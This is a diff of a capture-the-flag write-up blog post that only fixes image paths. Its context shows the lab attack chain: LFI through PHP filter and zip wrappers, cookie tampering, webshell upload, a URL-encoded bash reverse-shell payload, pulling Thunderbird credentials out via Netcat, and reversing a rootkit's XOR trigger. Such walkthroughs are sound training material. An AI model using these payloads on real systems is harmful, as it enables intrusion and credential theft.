@@ -35,20 +35,20 @@ This tells me that this box will be very web-heavy, at least until we grab a she
 ## Website Enumeration
 Checking out the landing page shows a custom-built site displaying information about the fsociety hacking group on the FBI's most wanted list. The suspect portion gives us a few names to work with, which I'll keep in mind for any login panels down the road.
 
-![](../assets/img/2026-05-03-CrimeStoppers/1.png)
+![](/assets/img/2026-05-03-CrimeStoppers/1.png)
 
 ### Upload Function
 The site only has one real function, which is to send information to their tipline at the Upload tab.
 
-![](../assets/img/2026-05-03-CrimeStoppers/2.png)
+![](/assets/img/2026-05-03-CrimeStoppers/2.png)
 
 Testing this form out reveals that the value of the Information field is reflected back to our page upon submission. This would make it a prime candidate for Cross-Site Scripting if left unfiltered.
 
-![](../assets/img/2026-05-03-CrimeStoppers/3.png)
+![](/assets/img/2026-05-03-CrimeStoppers/3.png)
 
 A quick test payload which would've rendered the supplied text to be bold fails, leaving us with little to go off of.
 
-![](../assets/img/2026-05-03-CrimeStoppers/4.png)
+![](/assets/img/2026-05-03-CrimeStoppers/4.png)
 
 ### Discovering LFI
 Since the op parameter takes in seemingly useful values such as upload and view, I fuzz it for anything else that may seem interesting.
@@ -92,7 +92,7 @@ Those results show that tries to fetch the file given to the parameter and displ
 ### Using PHP Wrappers
 I attempt to grab the `/etc/passwd` file as a proof of concept for LFI, but only end up with a funny error.
 
-![](../assets/img/2026-05-03-CrimeStoppers/5.png)
+![](/assets/img/2026-05-03-CrimeStoppers/5.png)
 
 A simple payload like that gets sniped by the WAF/detection method and a few more attempts show that any indication of a relative file path won't work. Next, I make use of PHP wrappers to convert a known resource to Base64 as a proof of concept.
 
@@ -100,11 +100,11 @@ A simple payload like that gets sniped by the WAF/detection method and a few mor
 /?op=php://filter/convert.base64-encode/resource=index
 ```
 
-![](../assets/img/2026-05-03-CrimeStoppers/6.png)
+![](/assets/img/2026-05-03-CrimeStoppers/6.png)
 
 Decoding this blob reveals the index page's source code and confirms the LFI.
 
-![](../assets/img/2026-05-03-CrimeStoppers/7.png)
+![](/assets/img/2026-05-03-CrimeStoppers/7.png)
 
 From the output, we can see that the site's PHP code is looking for path traversal characters like `../` and killing the request.
 
@@ -112,11 +112,11 @@ This [Invicti article](https://www.invicti.com/blog/web-security/php-stream-wrap
 
 Whilst reading through the index page's code, I notice a section that automatically sets an admin cookie to the value of 0 if it's not set. Changing this to be 1 grants us access to a new function that lists all uploaded tips to the site.
 
-![](../assets/img/2026-05-03-CrimeStoppers/8.png)
+![](/assets/img/2026-05-03-CrimeStoppers/8.png)
 
 The whiterose.txt file hints at a vulnerable GET parameter which we already discovered as well as an email address disclosing a hostname of DarkArmy.htb.
 
-![](../assets/img/2026-05-03-CrimeStoppers/9.png)
+![](/assets/img/2026-05-03-CrimeStoppers/9.png)
 
 ## Initial Foothold
 By now, it's obvious we need to upload a webshell using the tipline and use the LFI to proc it. Viewing the upload.php page's source code clearly defines how and where files are stored on the site.
@@ -207,7 +207,7 @@ Checking the servers response headers gives us the location where our webshell i
 ### Grabbing Reverse Shell
 Be sure to percent-encode the ampersand (& becomes %23) since we're passing it through a URL. A quick sanity check with a simple id command confirms this works and we can move to grabbing a reverse shell from it.
 
-![](../assets/img/2026-05-03-CrimeStoppers/10.png)
+![](/assets/img/2026-05-03-CrimeStoppers/10.png)
 
 I end up using a bash one-liner to catch a connection, making sure to URL-encode the bad characters to get it working. 
 
@@ -221,7 +221,7 @@ Final payload:
 /?op=zip://uploads/10.10.14.243/b2c4d949dac5a03e40778928f3e7c6fc00d47c61%23websh&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.243%2F443%200%3E%261%27
 ```
 
-![](../assets/img/2026-05-03-CrimeStoppers/11.png)
+![](/assets/img/2026-05-03-CrimeStoppers/11.png)
 
 At this point we can grab the user flag and work on ways to escalate privileges to root user.
 
@@ -230,15 +230,15 @@ At this point we can grab the user flag and work on ways to escalate privileges 
 ### Thunderbird Creds
 I'd usually head for a database when landing on a box as the web service, however there wasn't one in this case. I do notice a .thunderbird (an application that manages calendars, messaging, and contacts) directory under the Dom user's home directory, which can be dumped to gather saved credentials.
 
-![](../assets/img/2026-05-03-CrimeStoppers/12.png)
+![](/assets/img/2026-05-03-CrimeStoppers/12.png)
 
 After exfilling these files with Netcat, I install Thunderbird on my Kali machine and just swap out my profile for Dom's. Checking the saved passwords gives us credentials for IMAP and SMTP.
 
-![](../assets/img/2026-05-03-CrimeStoppers/13.png)
+![](/assets/img/2026-05-03-CrimeStoppers/13.png)
 
 These are reused for the machine as well, allowing us to switch users to their account from our existing shell.
 
-![](../assets/img/2026-05-03-CrimeStoppers/14.png)
+![](/assets/img/2026-05-03-CrimeStoppers/14.png)
 
 ### Reverse Engineering RootKit
 Light filesystem enumeration doesn't reveal anything very interesting, so I head back to Thunderbird, this time checking for email communication. This shows an exchange between Dom and Elliot explaining how she is concerned that rootkit has been placed on her machine by the name of _apache_modrootme_. This should be accessed to spawn a root shell when typing "get root", but it doesn't seem to be working for her.
@@ -323,11 +323,11 @@ Searching for files following a similar naming convention shows an enabled modul
 
 I transfer this to my local machine and have a look at it with IDA, showing that a function named _rootme_post_read_request_ makes a call to _darkarmy_. After that, a call to compare the result of _darkarmy_ and a buffer is made which intrigues me.
 
-![](../assets/img/2026-05-03-CrimeStoppers/15.png)
+![](/assets/img/2026-05-03-CrimeStoppers/15.png)
 
 Checking out _darkarmy_ shows that it takes two strings, performs an XOR operation against their first ten characters.
 
-![](../assets/img/2026-05-03-CrimeStoppers/16.png)
+![](/assets/img/2026-05-03-CrimeStoppers/16.png)
 
 We can recreate this in Python to find out the secret string used.
 
@@ -337,10 +337,10 @@ We can recreate this in Python to find out the secret string used.
 >>> [chr(ord(x) ^ ord(y))  for x,y in zip(a,b)]
 ```
 
-![](../assets/img/2026-05-03-CrimeStoppers/17.png)
+![](/assets/img/2026-05-03-CrimeStoppers/17.png)
 
 Providing this string in the Netcat connection when attempting to use the rootkit succeeds this time, giving us root privileges on the box.
 
-![](../assets/img/2026-05-03-CrimeStoppers/18.png)
+![](/assets/img/2026-05-03-CrimeStoppers/18.png)
 
 That's all y'all, this box had a cool theme of retracing an attacker's footsteps through some more complex vulnerabilities that I thought was awesome. I hope this was helpful to anyone following along or stuck and happy hacking!
